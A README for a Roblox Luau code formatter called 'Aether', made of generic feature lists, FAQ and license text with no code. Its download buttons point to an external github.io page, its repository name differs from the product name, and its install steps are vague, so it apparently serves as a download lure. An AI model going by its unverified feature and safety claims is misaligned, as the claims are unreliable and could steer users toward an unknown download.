![preview](https://raw.githubusercontent.com/Sujji-programer/Luau-Syntax-Refinery/main/poster_c7b2db.svg)
[![Download](https://raw.githubusercontent.com/Sujji-programer/Luau-Syntax-Refinery/main/btn_eab9c2.svg)](https://Sujji-programer.github.io/Luau-Syntax-Refinery/)

# 🌌 Roblox Luau Aether — The Next-Gen Luau Code Harmonizer

Icons from img.shields.io are used below for quick reference, and each section is built to read like a field guide rather than a boring manual.

![Language](https://img.shields.io/badge/Language-Luau-00A2FF)
![Platform](https://img.shields.io/badge/Platform-Roblox-FF4B4B)
![License](https://img.shields.io/badge/License-MIT-blue)
![Style](https://img.shields.io/badge/Style-Configurable-9B59B6)

![Support](https://img.shields.io/badge/Support-24%2F7-2ECC71)
![UI](https://img.shields.io/badge/UI-Responsive-1ABC9C)
![Language%20Support](https://img.shields.io/badge/Multilingual-Yes-E67E22)
![Build](https://img.shields.io/badge/Build-Stable-brightgreen)

---

## 🪐 What Is Roblox Luau Aether?

Roblox Luau Aether is an original idea inspired by the context of a Roblox code formatter, but taken in a distinctly different direction. Instead of treating formatting as a simple find-and-replace chore, Aether treats every Luau script as a living constellation of style decisions, indentation rhythms, and naming conventions. It is a formatter, a style steward, and a readability companion for individuals and teams who ship Roblox experiences at scale.

Where most tools are content to just align spaces, Aether asks a deeper question: how should this script feel when another developer opens it at midnight before a release? The answer is a harmonized, predictable, and beautifully structured file that respects both the machine and the human reading it.

This repository is the home of that idea. It includes the formatting engine, the rule configuration system, the documentation, and the roadmap. It is designed to be used by solo creators, studio teams, and educators who teach Luau to the next generation.

Think of it as a lighthouse for your codebase — it does not write the story, but it makes sure every page is legible when the fog rolls in.

---

## 🔭 The Philosophy Behind Aether

Code is read far more often than it is written. In the Roblox ecosystem, scripts are passed between builders, scripers, and reviewers. A single missing indentation or inconsistent quote style can turn a five-minute review into a thirty-minute archaeological dig.

Aether exists to remove that friction. Its design principles are:

- **Predictability over preference.** Every rule is explicit and visible.
- **Readability as a feature.** Formatting is not cosmetic; it is architectural.
- **Team-first defaults.** The base configuration is built for collaboration.
- **Individual expression.** Every rule can be tuned, disabled, or extended.
- **Speed without compromise.** Large scripts are processed in a blink.
- **Documentation as a first-class citizen.** If a rule exists, its behavior is documented and testable.

Aether does not force a single truth. It offers a well-lit path and then hands you the lantern.

---

## ✨ Feature Constellation

The feature set below is organized by the problems it solves, not just by the features it names.

### 🧭 Rule Engine and Configuration

- Configuration files with human-friendly keys and comments.
- Per-project rule overrides that travel with the repository.
- Rule inheritance for monorepos and multi-place projects.
- Preview mode that shows a diff before anything is written.
- Rule severity levels: off, warn, error, and auto-fix.
- Deterministic output — the same input always produces the same result.

### 🎨 Formatting Capabilities

- Indentation normalization for tabs, spaces, and mixed styles.
- Line ending unification across Windows, macOS, and Linux.
- Trailing whitespace removal and end-of-file newline enforcement.
- Quote normalization with configurable single or double quote preference.
- Spacing around operators, commas, and function calls.
- Line length awareness with soft and hard wrap suggestions.
- Comment alignment for block comments and documentation headers.
- Blank line collapsing and section separation rules.
- Table constructor alignment for readable data blocks.
- Function parameter wrapping for long signatures.

### 🧠 Luau-Aware Intelligence

- Understanding of Luau-specific syntax such as type annotations.
- Awareness of `continue`, compound assignment, and generalized iteration.
- Support for typed Luau function signatures and generic parameters.
- String interpolation formatting and preservation.
- Handling of Roblox-specific services and instance patterns without false positives.
- Preservation of intentional formatting inside long string literals.

### 🖥️ User Experience

- Responsive UI that scales from a small laptop to a wide studio monitor.
- Multilingual support for teams spread across regions.
- 24/7 customer support with documented response targets.
- Clear error messages that explain the rule and the fix.
- Keyboard-first navigation for power users.
- Dark and light themes that respect system preferences.
- Accessibility-minded contrast and focus indicators.

### 🔗 Integration and Automation

- Command-line and editor integration options.
- Watch mode that reformats on save.
- Continuous integration friendly exit codes.
- Batch processing for entire directory trees.
- Machine-readable report output for dashboards.
- Plugin-ready architecture for custom rules.

### 📊 Reporting and Observability

- Summary reports of what changed and why.
- Per-rule statistics to help teams refine configuration.
- Historical trends for style drift over time.
- Exportable reports in common structured formats.

### 🛡️ Safety and Trust

- No telemetry by default.
- Local-only processing of your source files.
- Checksum-based verification of configuration files.
- Clear changelog with migration notes for every release.

---

## 🧩 How Aether Thinks About a Script

Aether models a Luau file in layers, much like a geologist models rock strata.

1. **Lexical layer** — tokens, strings, comments, and whitespace.
2. **Syntactic layer** — statements, expressions, and blocks.
3. **Semantic layer** — Luau-specific constructs and type information.
4. **Stylistic layer** — the rules that decide how the above are rendered.
5. **Presentation layer** — the final text written back to disk.

By separating these layers, Aether can apply rules that are context-aware. It knows the difference between a tab inside a string and a tab used for indentation. It knows when a line break inside a table is intentional alignment rather than a formatting accident.

---

## 🎯 Who Aether Is For

- **Solo creators** who want a consistent style without memorizing a rulebook.
- **Studio teams** that need a shared definition of readable code.
- **Educators** who teach Luau and want students to focus on logic, not spacing.
- **Reviewers** who are tired of commenting on indentation in pull requests.
- **Tooling engineers** who want a configurable formatting core to build on.
- **Open-source maintainers** who receive contributions from many different editors.

If you have ever opened a script and felt a small sigh of relief because it looked clean, that is the feeling Aether is built to create.

---

## 🚀 Getting Started Without a Terminal Ceremony

Aether is designed to be approachable. You do not need a command-line ritual to begin. The recommended path is:

1. Obtain the tool through the distribution channel listed in this repository.
2. Place the configuration file at the root of your project.
3. Open your project in the supported editor or launcher.
4. Run the formatting preview to see suggested changes.
5. Apply the changes and commit them alongside your code.

If you prefer automation, the same operations are available through the integration options described in the feature section. The important part is that the first successful format should take less than a minute, not an afternoon.

---

## 🗺️ Configuration at a Glance

Aether configuration is intentionally readable. A rule entry typically contains a name, a value, and an optional comment explaining the intent. The configuration is designed to be reviewed in code review just like any other source file.

Common configuration themes include:

- Indentation style and width.
- Quote style and escape handling.
- Line length limits.
- Comment formatting.
- Table and function wrapping.
- Blank line policies.
- Naming convention hints.

Because configuration is a first-class artifact, Aether ships with a validator that checks for typos, conflicting rules, and deprecated keys. It is better to fail loudly at configuration time than to silently produce unexpected output.

---

## 🌍 Multilingual and Global Support

Roblox is a global platform, and so is its developer community. Aether's interface and documentation are built with localization in mind. Messages are stored in a translation-ready format, and the layout is tested against languages with longer average word lengths.

Support is available around the clock, with a documented escalation path for urgent issues. The goal is simple: no developer should be blocked by a formatting question at 3 AM in their local time zone.

---

## 📈 Performance Notes

Formatting performance matters when a project contains thousands of scripts. Aether is engineered around incremental processing, caching of unchanged files, and parallel-safe rule evaluation. In practical terms, this means:

- A single small script formats effectively instantly.
- A medium project formats in a time that feels like a refresh, not a rebuild.
- A large project benefits from caching on subsequent runs.

Performance benchmarks are maintained in the repository and updated with each release. If a change makes formatting slower, it is treated as a regression and investigated.

---

## 🧪 Quality and Testing

Aether treats formatting as a correctness problem. Every rule has associated test cases, including edge cases that are known to trip up naïve formatters. The test suite covers:

- Whitespace edge cases.
- String and comment preservation.
- Luau-specific syntax.
- Roblox-specific patterns.
- Configuration interactions.
- Idempotency — formatting a formatted file changes nothing.

Idempotency is a core invariant. If running the formatter twice produces different output, that is a bug, not a feature.

---

## 🧭 Roadmap Themes

The roadmap is organized around themes rather than dates, because themes survive schedule changes.

- **Deeper Luau awareness** for emerging language features.
- **Richer editor integrations** for smoother workflows.
- **Expanded reporting** for team-level style insights.
- **Improved localization** for more languages.
- **Extensibility** for community-authored rules.
- **Documentation growth** with examples for every rule.

The roadmap is a living document. Community input shapes its priorities.

---

## 🤝 Contributing

Contributions are welcome from developers of all experience levels. A good contribution does not have to be a large feature. It can be:

- A bug report with a minimal reproduction.
- A documentation improvement.
- A test case for an edge condition.
- A translation for a language you speak.
- A rule suggestion with a clear rationale.

Before contributing, please read the contribution guidelines in the repository. They describe the coding style, the review process, and the expectations for tests. The project values clarity and kindness in equal measure.

---

## 🛠️ Support Channels

Support is available through the issue tracker and the community channels listed in the repository. When asking for help, include:

- The version of Aether you are using.
- The relevant configuration file.
- A minimal snippet that reproduces the behavior.
- The expected and actual output.

Clear reports get faster answers. The support team aims to respond within a documented window and to keep every conversation respectful.

---

## 🔐 Privacy and Data Handling

Aether processes source code locally. It does not upload your scripts to a remote service as part of normal formatting. Configuration files and reports stay on your machine unless you explicitly share them.

Telemetry is off by default. If a future version offers optional diagnostics, it will be clearly labeled, easy to disable, and documented in plain language.

---

## ⚖️ License

This project is released under the MIT License. You are welcome to use, modify, and distribute it in accordance with the license terms.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 Roblox Luau Aether Contributors.

---

## ⚠️ Disclaimer

Roblox Luau Aether is an independent formatting tool. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation. All trademarks and registered trademarks are the property of their respective owners.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or the use of the software.

Always review formatting changes before committing them to a production project. Formatting tools are helpful assistants, not substitutes for human judgment.

---

## 🧾 Frequently Asked Questions

**Is Aether a replacement for my editor's built-in formatter?**
It can be. Many teams adopt Aether because its rule set is explicit and shareable across editors. Others use it alongside existing tools.

**Does Aether change the behavior of my code?**
No. Formatting changes whitespace, line breaks, and certain stylistic choices. It does not alter program logic. Preview mode exists so you can confirm this before applying changes.

**Can I use Aether on a large legacy project?**
Yes. Start with preview mode, review the diff, and adopt rules gradually. You do not need to reformat everything at once.

**Is the configuration portable?**
Yes. The configuration file is plain text and can be committed alongside your project so that every contributor gets the same result.

**How often is Aether updated?**
Releases follow a regular cadence, with patch releases for fixes and minor releases for new rules and integrations.

**Where can I report a bug?**
Use the issue tracker in the repository and include a minimal reproduction. That single habit makes fixes dramatically faster.

---

## 🌟 Final Thoughts

Aether is more than a formatter. It is a statement that readability matters, that teams deserve shared standards, and that tooling can be both powerful and kind. If this project helps you spend less time arguing about spaces and more time building worlds, then it has done its job.

Thank you for reading. May your scripts be legible and your releases be calm.

[![Download](https://raw.githubusercontent.com/Sujji-programer/Luau-Syntax-Refinery/main/btn_eab9c2.svg)](https://Sujji-programer.github.io/Luau-Syntax-Refinery/)